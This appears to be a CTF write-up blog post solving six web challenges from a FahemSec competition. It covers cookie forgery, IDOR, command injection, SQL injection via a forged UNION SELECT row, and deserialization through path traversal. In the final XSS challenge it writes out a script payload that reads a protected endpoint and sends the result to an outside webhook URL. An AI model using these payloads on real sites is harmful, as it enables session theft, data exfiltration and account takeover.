---
categories:
  - Fahemsec
image:
  path: /assets/posts/FahmSec Ramadan CTF/preview.jpg
layout: post
stags:
title: FahemSec CTF
---

# Web
## Biscuits 

Hands down the hardest challenge of the ctf 
pressing on `ACCESS FLAG` gives us
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,.png)
Looking at the request we have a cookie called user which has the value user set to unauthenticated then base64 encoded 
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-1.png)
Setting it to admin gives us the flag 
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-2.png)
```
FahemSec{c00k13_m4n1pul4t10n_m4st3r_431241fa123}
```
## Knock Knock 

We got a normal login page so let's register and login with the account
There is an update_password endpoint 
looking at the request
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-3.png)
we could see that the user is encoded in the url changing the value to admin and then submitting it  will change the admin password
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-4.png)
```
FahemSec{IDOR_1s_C00l_FahemSec_w4s_h3r3}
```

## Checkup
It does a simple request with a service param 
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-5.png)
trying to inject with a simple command injection gives us the output back
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-6.png)
```
FahemSec{C0mm4nd_1nj3ct10ns_4r3_C0ol_471241f124a}
```

## ZeQL
To solve this challenge we need to access flag.php which is an admin only path so we need to become admin In `login.php` we could see a direct SQL injection so the idea is simple
1. Inject username with `UNION SELECT` to forge returned user row
2. Inject known bcrypt hash in forged row.
3. Submit matching plaintext password
4. requesting flag.php and getting the flag

the query will be 
```
UNION SELECT 1,'pwned', '{password_bcrypt}' -- -
```
and the origin password in the password field
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-7.png)
and just like that we became admin
```
FahemSec{ZeQL_m4st3r_Y0U_ar3_4m4z1nG_K3d4_k3d4}
```

## EzSystem

This is a whitebox challenge and the source code is needed first looking at the code we could find a dangerous sink
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-8.png)
the `deser.unserialize` could lead to code execution if it has been done with user data so the challenge here is to find a source to this path, looking closely we would find a path traversal ![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-9.png)
so the plain is simple 

1. Login with a normal user
2. Upload a serialized payload as XML and pasing it using path traversal 
3. trigger /restore_backup on crafted file
4. payload runs and executes 

![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-12.png)
get file name from /uploads

![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-10.png)

and run the code 
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-13.png)

```
FahemSec{N1c3_C4tch_Ch4mp_1f2410d10870a}
```


## Free flag
The idea in this challenge is to inject the xss in the the /visit endpoint the one that we could inject into is the visitor parameter the server checks only on a string so we could pass an array and then server side this array get's turned back into a string so we will send 2 requests the first request will contain the xss payload and then second request will be a reference to the first one that is injected 

That's the payload we will be using
```
payload="<script>fetch('/api/fetchflag').then(r=>r.text()).then(t=>{location='${WEB}/?d='+encodeURIComponent(t)})</script>"
```
just to get the flag to a webhook

The payload we will use for the first request
 ```
 {"url":"http://example.com","visitor":["<script>fetch('/api/fetchflag').then(r=>r.text()).then(t=>{location='https://webhook.site/8130c739-605b-497b-849c-0bbc69cfc27b/?d='+encodeURIComponent(t)})</script>"]}
 ```

sending
```
curl -sS -X POST "http://95.217.6.37:20007/visit" -H 'Content-Type: application/json' --data "$json1"
```
we got 
```
{"message":"Admin will check your report soon","referenceId":"c71fc258-d6b4-4ed9-8b8e-7387e493e2d1"}
```
now we will make the bot visit the report with the reference ID we just got 

parameters
```
{"url":"http://127.0.0.1:5000/api/reference/c71fc258-d6b4-4ed9-8b8e-7387e493e2d1","visitor":"trigger"}
```

Finally we will trigger the xss
```
curl -sS -X POST "http://95.217.6.37:20007/visit" -H 'Content-Type: application/json' --data "$json2"
```
![](/assets/posts/FahmSec Ramadan CTF/FahmSec%20Ramadan%20CTF,-14.png)
```
FahemSec{XSS_G3ts_H4rd3r_Th3se_D4ys}
```